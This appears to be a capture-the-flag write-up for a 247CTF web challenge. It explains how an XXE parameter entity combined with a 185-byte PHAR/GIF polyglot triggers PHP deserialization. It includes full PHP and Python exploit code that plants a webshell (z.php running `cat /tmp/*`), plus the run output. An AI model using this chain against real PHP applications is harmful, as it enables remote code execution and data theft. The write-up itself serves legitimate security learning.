# Meme Upload Service - 247CTF Writeup

## Challenge Info

- **Platform**: 247CTF
- **Category**: Web Exploitation
- **Techniques**: XXE, PHAR Deserialization, Polyglot Files
- **URL**: https://776fd06a930ec85d.247ctf.com/
- **Flag**: `247CTF{0073c38dXXXXXXXXXXXXXXXXccc5668f}`

---

## Source Code Analysis

### index.php

```php
<?php

class Message
{
    public function __construct($to, $from, $image)
    {
        $this->to = $to;
        $this->from = $from;
        $this->image = $image;
        $this->filePath = tempnam("/tmp/messages/", "") . ".txt";
    }

    public function __destruct()
    {
        file_put_contents($this->filePath, sprintf(
            "Hey %s! Take a look at this meme: %s! - %s",
            $this->to,
            $this->from,
            $this->image,
        ));
    }
}

if (isset($_POST["message"])) {
    $msgXml = new DOMDocument();
    $msgXml->loadXML($_POST["message"], LIBXML_DTDLOAD);
    if ($msgXml->schemaValidate("valid_message.xsd")) {
        $msgObj = new Message(
            $msgXml->getElementsByTagName("to")[0]->nodeValue,
            $msgXml->getElementsByTagName("from")[0]->nodeValue,
            $msgXml->getElementsByTagName("image")[0]->nodeValue
        );
        echo sprintf("Message stored %s!", $msgObj->filePath);
    } else {
        echo "Invalid XML!";
    }
} else if (isset($_FILES["image"])) {
    $imageTmp = $_FILES["image"]["tmp_name"];
    $imageSize = $_FILES["image"]["size"];
    $imageExt = strtolower(pathinfo($_FILES["image"]["name"], PATHINFO_EXTENSION));
    $imageMime = mime_content_type($imageTmp);
    $allowedExt = array("jpg", "jpeg", "gif", "png");
    $allowedMime = array("image/jpeg", "image/gif", "image/png");
    if (in_array($imageExt, $allowedExt) === false)
        die("Invalid extension!");
    if (in_array($imageMime, $allowedMime) === false)
        die("Invalid mime type!");
    if (getimagesize($imageTmp) === false || $imageSize > 185)
        die("Invalid size!");
    $uploadPath = tempnam("/tmp/images/", "") . "." . $imageExt;
    move_uploaded_file($imageTmp, $uploadPath);
    echo sprintf("Image uploaded %s!", $uploadPath);
} else {
    echo highlight_file(__FILE__, true);
}
```

### valid_message.xsd

```xml
<xs:schema attributeFormDefault="unqualified" elementFormDefault="qualified"
           xmlns:xs="http://www.w3.org/2001/XMLSchema">
<xs:element name="message">
  <xs:complexType>
    <xs:sequence>
      <xs:element name="to" minOccurs="1" maxOccurs="1"/>
      <xs:element name="from" minOccurs="1" maxOccurs="1"/>
      <xs:element name="image" minOccurs="1" maxOccurs="1"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
</xs:schema>
```

---

## Vulnerability Identification

### 1. XXE with LIBXML_DTDLOAD

The function `loadXML()` uses the `LIBXML_DTDLOAD` flag:

```php
$msgXml->loadXML($_POST["message"], LIBXML_DTDLOAD);
```

This flag allows loading external DTDs specified in the DOCTYPE. Although `LIBXML_NOENT` is not used (which would expand general entities like `&xxe;`), **parameter entities** (`%xxe;`) ARE processed during DTD loading.

### 2. Deserialization Gadget in the Message Class

The `Message` class has a `__destruct()` method that writes controllable content to a file:

```php
public function __destruct()
{
    file_put_contents($this->filePath, sprintf(
        "Hey %s! Take a look at this meme: %s! - %s",
        $this->to,
        $this->from,
        $this->image,
    ));
}
```

If we control `$this->filePath` and `$this->to`, we can write arbitrary PHP code.

### 3. Image Upload with 185 Byte Limit

The system allows uploading images with restrictions:
- Extension: jpg, jpeg, gif, png
- MIME type: image/jpeg, image/gif, image/png
- `getimagesize()` must return true
- Maximum size: **185 bytes**

---

## Exploitation Strategy

### Attack Chain

1. Create a PHAR polyglot file that:
   - Passes as a valid GIF image (magic bytes, mime, getimagesize)
   - Contains serialized metadata with a malicious `Message` object
   - Is less than or equal to 185 bytes

2. Upload the PHAR polyglot as a GIF image

3. Send XML with a parameter entity XXE pointing to `phar:///tmp/images/file.gif`

4. When libxml loads the "DTD" via `phar://`, PHP deserializes the PHAR metadata

5. The deserialized `Message` object executes `__destruct()` when destroyed, writing a webshell

6. Access the webshell to obtain the flag

### Why Parameter Entities and not General Entities

With only `LIBXML_DTDLOAD` (without `LIBXML_NOENT`):

- **General entities** (`&xxe;`): are NOT expanded in the document content
- **Parameter entities** (`%xxe;`): ARE processed within the DTD

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "phar:///tmp/images/file.gif">
  %xxe;
]>
```

When the parser encounters `%xxe;` in the internal DTD, it attempts to load the SYSTEM resource, which triggers the `phar://` wrapper.

---

## Building the PHAR Polyglot

### The Problem: 185 Bytes

A PHAR normally generated with the PHP API has approximately 197 minimum bytes, exceeding the limit. The solution is to build the PHAR manually, optimizing every byte.

### PHAR Structure

```
[STUB][MANIFEST_LENGTH][MANIFEST][FILE_CONTENTS][SIGNATURE][SIG_TYPE][MAGIC]
```

Components:
- **Stub**: PHP code ending with `__HALT_COMPILER();`
- **Manifest**: File metadata (number of files, API version, serialized metadata)
- **Signature**: SHA1 hash of the content (20 bytes)
- **Magic**: `GBMB` (4 bytes)

### Applied Optimizations

1. **Minimal stub with GIF magic**: `GIF8__HALT_COMPILER(); ?>\r\n` (27 bytes)
   - `GIF8` is sufficient for `mime_content_type()` to detect `image/gif`
   - `getimagesize()` interprets the following bytes as dimensions (large but valid values)

2. **Minimal internal file**: name `0`, empty content

3. **Optimized metadata**: Only necessary properties (`to` and `filePath`)

4. **Compact payload**: `` <?=`cat /tmp/*`?> `` (17 characters)

### Generation Code

```php
<?php
class Message { public $to; public $filePath; }

$m = new Message;
$m->filePath = "z.php";
$m->to = "<?=`cat /tmp/*`?>";
$metadata = serialize($m);

// Stub that passes as GIF
$stub = "GIF8__HALT_COMPILER(); ?>\r\n";

// Internal file
$filename = "0";
$filecontent = "";

// Build manifest
$manifest = "";
$manifest .= pack("V", 1);                    // Num files: 1
$manifest .= pack("v", 0x0011);               // API version
$manifest .= pack("V", 0x00010000);           // Flags: has signature
$manifest .= pack("V", 0);                    // Alias length: 0
$manifest .= pack("V", strlen($metadata));    // Metadata length
$manifest .= $metadata;                       // Serialized metadata

// File entry
$manifest .= pack("V", strlen($filename));    // Filename length
$manifest .= $filename;                       // Filename
$manifest .= pack("V", strlen($filecontent)); // Uncompressed size
$manifest .= pack("V", 0);                    // Timestamp
$manifest .= pack("V", strlen($filecontent)); // Compressed size
$manifest .= pack("V", crc32($filecontent));  // CRC32
$manifest .= pack("V", 0x000001A4);           // Flags (permissions)
$manifest .= pack("V", 0);                    // Per-file metadata length

// Assemble PHAR
$phar_data = $stub;
$phar_data .= pack("V", strlen($manifest));   // Manifest length
$phar_data .= $manifest;
$phar_data .= $filecontent;

// SHA1 Signature
$sig_data = hash("sha1", $phar_data, true);
$phar_data .= $sig_data;
$phar_data .= pack("V", 0x0002);              // Signature type: SHA1
$phar_data .= "GBMB";                         // Magic

file_put_contents("exploit.phar", $phar_data);
// Final size: exactly 185 bytes
```

### PHAR Verification

```
$ xxd exploit.phar
00000000: 4749 4638 5f5f 4841 4c54 5f43 4f4d 5049  GIF8__HALT_COMPI
00000010: 4c45 5228 293b 203f 3e0d 0a7e 0000 0001  LER(); ?>..~....
00000020: 0000 0011 0000 0001 0000 0000 004f 0000  .............O..
00000030: 004f 3a37 3a22 4d65 7373 6167 6522 3a32  .O:7:"Message":2
00000040: 3a7b 733a 323a 2274 6f22 3b73 3a31 373a  :{s:2:"to";s:17:
00000050: 223c 3f3d 6063 6174 202f 746d 702f 2a60  "<?=`cat /tmp/*`
00000060: 3f3e 223b 733a 383a 2266 696c 6550 6174  ?>";s:8:"filePat
00000070: 6822 3b73 3a35 3a22 7a2e 7068 7022 3b7d  h";s:5:"z.php";}
00000080: 0100 0000 3000 0000 0000 0000 0000 0000  ....0...........
00000090: 0000 0000 00a4 0100 0000 0000 00[SHA1..]
000000b0: [............]02 0000 0047 424d 42      .....GBMB
```

---

## Complete Exploit

```python
#!/usr/bin/python3
import requests
import urllib.parse
import re

RHOST = "776fd06a930ec85d.247ctf.com"

# 185-byte PHAR polyglot (pre-generated)
def generate_phar():
    # Serialized metadata
    metadata = b'O:7:"Message":2:{s:2:"to";s:17:"<?=`cat /tmp/*`?>";s:8:"filePath";s:5:"z.php";}'

    stub = b"GIF8__HALT_COMPILER(); ?>\r\n"
    filename = b"0"
    filecontent = b""

    import struct
    import hashlib

    # Manifest
    manifest = b""
    manifest += struct.pack("<I", 1)                      # Num files
    manifest += struct.pack("<H", 0x0011)                 # API version
    manifest += struct.pack("<I", 0x00010000)             # Flags
    manifest += struct.pack("<I", 0)                      # Alias length
    manifest += struct.pack("<I", len(metadata))          # Metadata length
    manifest += metadata

    # File entry
    manifest += struct.pack("<I", len(filename))
    manifest += filename
    manifest += struct.pack("<I", len(filecontent))       # Uncompressed
    manifest += struct.pack("<I", 0)                      # Timestamp
    manifest += struct.pack("<I", len(filecontent))       # Compressed
    import binascii
    manifest += struct.pack("<I", binascii.crc32(filecontent) & 0xffffffff)
    manifest += struct.pack("<I", 0x000001A4)             # Flags
    manifest += struct.pack("<I", 0)                      # Per-file meta

    # Assemble
    phar = stub
    phar += struct.pack("<I", len(manifest))
    phar += manifest
    phar += filecontent

    # SHA1 signature
    sig = hashlib.sha1(phar).digest()
    phar += sig
    phar += struct.pack("<I", 0x0002)
    phar += b"GBMB"

    return phar

print("[*] Generating PHAR polyglot...")
phar_data = generate_phar()
print(f"    Size: {len(phar_data)} bytes")

print("[*] Uploading as GIF...")
files = {"image": ("exploit.gif", phar_data, "image/gif")}
r = requests.post(f"https://{RHOST}", files=files)
print(f"    Response: {r.text}")

if "Invalid" in r.text:
    print("[-] Upload failed")
    exit(1)

img_path = r.text.strip().rstrip("!").split("/")[-1]
print(f"    Uploaded: {img_path}")

print("[*] Sending XXE payload...")
xml = f'''<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY % xxe SYSTEM "phar:///tmp/images/{img_path}">
  %xxe;
]>
<message><to>x</to><from>y</from><image>z</image></message>'''

r = requests.post(f"https://{RHOST}", data={"message": xml})
print(f"    Response: {r.text}")

print("[*] Accessing webshell...")
r = requests.get(f"https://{RHOST}/z.php")
print(f"    Status: {r.status_code}")
print(f"    Content: {r.text}")

flag = re.search(r"247CTF\{[0-9a-f]{32}\}", r.text)
if flag:
    print(f"\n[+] FLAG: {flag[0]}")
```

---

## Execution

```
$ python3 exploit.py
[*] Generating PHAR polyglot...
    Size: 185 bytes
[*] Uploading as GIF...
    Response: Image uploaded /tmp/images/oG85DY.gif!
    Uploaded: oG85DY.gif
[*] Sending XXE payload...
    Response: Message stored /tmp/messages/1Z0TYH.txt!
[*] Accessing webshell...
    Status: 200
    Content: Hey 247CTF{0073c38dXXXXXXXXXXXXXXXXccc5668f}
! Take a look at this meme: ! -

[+] FLAG: 247CTF{0073c38dXXXXXXXXXXXXXXXXccc5668f}
```

---

## Lessons Learned

1. **LIBXML_DTDLOAD without LIBXML_NOENT**: Parameter entities (`%xxe;`) are processed even though general entities (`&xxe;`) are not expanded.

2. **PHAR Deserialization**: The `phar://` wrapper automatically deserializes metadata when accessing the file, without needing to explicitly call `unserialize()`.

3. **Polyglot Files**: PHAR files allow arbitrary prefixes in the stub, which makes it easy to create polyglots that pass file type validations.

4. **Size Limits as Defense**: The 185-byte limit was designed to make it difficult to create valid PHARs, but with manual construction and optimization it can be achieved.

5. **Gadgets in __destruct**: Magic methods like `__destruct()` are common vectors for exploiting insecure deserialization.

---

## References

- [PHP PHAR Format Specification](https://www.php.net/manual/en/phar.fileformat.php)
- [BlackHat 2018 - It's a PHP Unserialization Vulnerability Jim, but Not as We Know It](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
